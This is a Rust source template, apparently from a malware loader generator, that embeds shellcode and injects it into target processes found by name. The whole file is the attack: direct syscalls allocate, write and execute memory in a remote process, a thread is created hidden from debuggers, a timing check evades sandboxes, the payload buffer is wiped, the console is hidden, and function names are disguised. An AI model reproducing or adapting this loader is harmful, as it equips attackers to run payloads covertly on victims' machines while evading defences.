#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use sysinfo::System;
use std::ffi::OsStr;
use std::include_bytes;
use rust_syscalls::syscall;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READ;
use winapi::um::winnt::THREAD_ALL_ACCESS;
use std::{ptr::null_mut};
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
use winapi::shared::ntdef::NULL;

use std::time::Instant;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<usize> {
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(OsStr::new(tar)) {
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }
    dom
}

fn pause(ms: i64) {
    unsafe {
        let interval: i64 = -(ms * 10_000);
        let _ = syscall!("NtDelayExecution", 0u32, &interval as *const i64);
    }
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {
        let s = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
        if !NT_SUCCESS(s) { return; }

        pause(150);

        let mut base: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let s = syscall!("NtAllocateVirtualMemory", process_handle, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(s) { return; }

        pause(200);

        let buf_len = buf.len();
        let mut written: usize = 0;
        let s = syscall!("NtWriteVirtualMemory", process_handle, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
        if !NT_SUCCESS(s) { return; }

        wipe(&mut buf);
        pause(150);

        let mut old_perms = PAGE_READWRITE;
        let mut psize = buf_len;
        let s = syscall!("NtProtectVirtualMemory", process_handle, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old_perms);
        if !NT_SUCCESS(s) { return; }

        pause(100);

        let mut thread_handle: *mut c_void = null_mut();
        let _s = syscall!("NtCreateThreadEx", &mut thread_handle, THREAD_ALL_ACCESS, NULL, process_handle, base, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0_usize, 0_usize, 0_usize, NULL);
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let tar: &str = "{{TARGET_PROCESS}}";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    let list: Vec<usize> = boxboxbox(tar);
    if !list.is_empty() {
        for i in &list {
            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}